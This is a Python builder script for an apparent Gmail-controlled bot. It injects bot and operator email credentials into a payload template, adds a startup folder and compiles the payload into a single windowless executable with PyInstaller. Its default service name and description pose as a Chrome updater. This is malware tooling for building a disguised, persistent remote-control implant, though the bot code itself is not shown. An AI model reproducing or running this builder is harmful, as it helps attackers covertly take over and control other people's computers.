import os
import os.path
import shutil
import subprocess
import sys



#FOLDERS
output = os.path.abspath("output/")
build = os.path.abspath("build")
src_dir = os.path.abspath('bot/startup')
dest_dir = os.path.abspath('output/startup')
#PATHS
mainfile = os.path.abspath("bot/gmail.py")
pythonpayloadfile = os.path.join(output,"gmail.py")
specfile = "gmail.spec"
#Filenames



class Builder:
    def __init__(self,botemail,botpass,youremail,service_name="ChromeUpdate",display_name="Chrome Update",desc="Updates Chrome Software") -> None:
        self.BOTEMAIL = botemail
        self.BOTPASSWORD = botpass
        self.YOUREMAIL = youremail
        self.SERVICE_NAME = service_name
        self.DISPLAY_NAME = display_name
        self.DESC = desc
            
    def setCreds(self):
        with open(mainfile,'r')as f:
            code = f.read()
            f.close()
        code = code.replace("###Username",self.BOTEMAIL)
        code = code.replace('###Password',self.BOTPASSWORD)
        code = code.replace("###YourEmail",self.YOUREMAIL)
        code = code.replace("###SerName",self.SERVICE_NAME)
        code = code.replace("###DisName",self.DISPLAY_NAME)
        code = code.replace("###Desc",self.DESC)
        with open(pythonpayloadfile,'w')as f:
            f.write(code)
            f.close()
    
    def addStartupFolder(self):
        if os.path.exists(dest_dir):
            shutil.rmtree(dest_dir)

        # Copy the directory
        shutil.copytree(src_dir, dest_dir)

    def clean(self):
        if os.path.exists(dest_dir):
            shutil.rmtree(dest_dir)
        
        if os.path.exists(build):
            shutil.rmtree(build)
            os.remove(specfile)
    
    
    def createExe(self,script_path, output_dir=None):
        """
        Run PyInstaller to create an executable from a Python script.

        :param script_path: Path to the Python script to be converted to an executable.
        :param output_dir: (Optional) Directory where the executable should be saved.
        """
        # Ensure the script path is absolute
        script_path = os.path.abspath(script_path)

        # Build the PyInstaller command
        command = [
            sys.executable,  # Use the current Python interpreter
            '-m', 'PyInstaller',
            '--onefile',  # Create a single-file executable
            '--noconsole',
            script_path
        ]

        if output_dir:
            output_dir = os.path.abspath(output_dir)
            command.extend(['--distpath', output_dir])

        # Run the command
        try:
            output = subprocess.run(command)
            print(f"Executable created successfully in {output_dir or 'dist/'}")
        except subprocess.CalledProcessError as e:
            print(f"Error: {e.stderr}")
            sys.exit(1)
    

    def main_builder(self):
        self.setCreds()
        self.addStartupFolder()
        self.createExe(pythonpayloadfile,output)
        self.clean()







if __name__ == "__main__":
    b = Builder('','','')
    b.main_builder()
    